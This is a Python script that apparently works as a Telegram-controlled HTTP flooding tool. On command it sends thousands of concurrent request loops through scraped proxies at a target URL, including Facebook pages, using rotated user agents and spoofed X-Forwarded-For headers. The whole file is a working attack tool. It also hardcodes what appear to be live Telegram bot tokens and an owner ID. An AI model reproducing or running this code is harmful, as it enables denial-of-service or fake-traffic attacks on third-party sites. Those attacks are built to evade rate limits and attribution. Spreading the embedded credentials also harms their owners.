import asyncio
import aiohttp
import random
from aiohttp import web

# [AIP2K SOVEREIGN COMMAND CENTER - GOD MODE ULTIMATE]
MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
MASTER_ID = 1938591484
SLAVE_ARMY = {
    "S1": "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0", "S2": "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
    "S3": "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE", "S4": "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
    "S5": "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI", "S6": "8201736485:AAGFSv-af1506M9pipoaFbHKQW2vLloIMFk",
    "S7": "8420555273:AAHD4mJVw1wY0_nQVSenIBNEaAomcH98sXo", "S8": "8524480261:AAGCe54hX-9PjDsVQW5whE36kj5IBNmKRKA",
    "S9": "8579851332:AAGSd7Mtze2XfBlFoQWcIL5JrzBiz47qXAI", "S10": "8525114674:AAE7LnGxkqaaL6M0DH25NiU3WYHygWYlON4"
}

class AIP2K_God_Core:
    def __init__(self):
        self.session = None
        self.targets = {}
        self.proxies = []
        self.stats = {name: {"ok": 0, "no": 0} for name in SLAVE_ARMY}
        self.soldier_active = {name: True for name in SLAVE_ARMY}
        self.identities = {}

    async def _fetch_proxies(self):
        urls = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http", 
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"]
        while True:
            temp = []
            for u in urls:
                try:
                    async with self.session.get(u, timeout=10) as r:
                        if r.status == 200: temp.extend((await r.text()).splitlines())
                except: pass
            if temp: self.proxies = list(set(temp))
            await asyncio.sleep(300)

    async def _notify(self, text):
        print(f">>> [GOD-LOG]: {text}")
        url = f"https://api.telegram.org/bot{MASTER_TOKEN}/sendMessage"
        try: await self.session.post(url, json={'chat_id': MASTER_ID, 'text': text, 'parse_mode': 'Markdown'})
        except: pass

    async def _strike_engine(self, name, target_url):
        while target_url in self.targets and self.soldier_active[name]:
            proxy = random.choice(self.proxies) if self.proxies else None
            agents = [
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            ]
            h = {
                'User-Agent': random.choice(agents),
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Referer': 'https://www.google.com/',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site'
            }
            try:
                final_url = target_url.replace("www.facebook", "mbasic.facebook")
                async with self.session.get(final_url, headers=h, proxy=f"http://{proxy}" if proxy else None, timeout=15) as r:
                    if r.status == 200:
                        self.stats[name]["ok"] += 1
                        if self.stats[name]["ok"] % 100 == 0:
                            print(f"🔥 {name} HIT: {self.stats[name]['ok']}")
                    else:
                        self.stats[name]["no"] += 1
            except:
                self.stats[name]["no"] += 1
            await asyncio.sleep(random.uniform(0.05, 0.2))

    async def handle_updates(self):
        offset = 0
        asyncio.create_task(self._fetch_proxies())
        await self._notify("🔱 **AIP2K GOD MODE RELOADED**\nAll successful logics merged into one engine.")
        while True:
            try:
                url = f"https://api.telegram.org/bot{MASTER_TOKEN}/getUpdates?offset={offset}"
                async with self.session.get(url) as r:
                    data = await r.json()
                    for u in data.get('result', []):
                        offset = u['update_id'] + 1
                        cmd = u.get('message', {}).get('text', '')
                        if u.get('message', {}).get('from', {}).get('id') != MASTER_ID: continue

                        if cmd.startswith("http"):
                            self.targets = {cmd: True}
                            await self._notify(f"⚔️ **ULTIMATE ATTACK STARTED:**\n{cmd}")
                            for name in SLAVE_ARMY:
                                for _ in range(350):
                                    asyncio.create_task(self._strike_engine(name, cmd))
                        elif cmd == "/status":
                            res = "📊 **LIVE STATUS:**\n" + "\n".join([f"{n}: ✅{self.stats[n]['ok']} | ❌{self.stats[n]['no']}" for n in SLAVE_ARMY])
                            await self._notify(res)
                        elif cmd == "/stop":
                            self.targets = {}; await self._notify("🛑 **OPERATIONS CEASED.**")
            except: await asyncio.sleep(1)

async def main():
    bot = AIP2K_God_Core()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as sess:
        bot.session = sess
        app = web.Application(); runner = web.AppRunner(app)
        await runner.setup(); await web.TCPSite(runner, '0.0.0.0', 10000).start()
        await bot.handle_updates()

if __name__ == "__main__":
    asyncio.run(main())
    
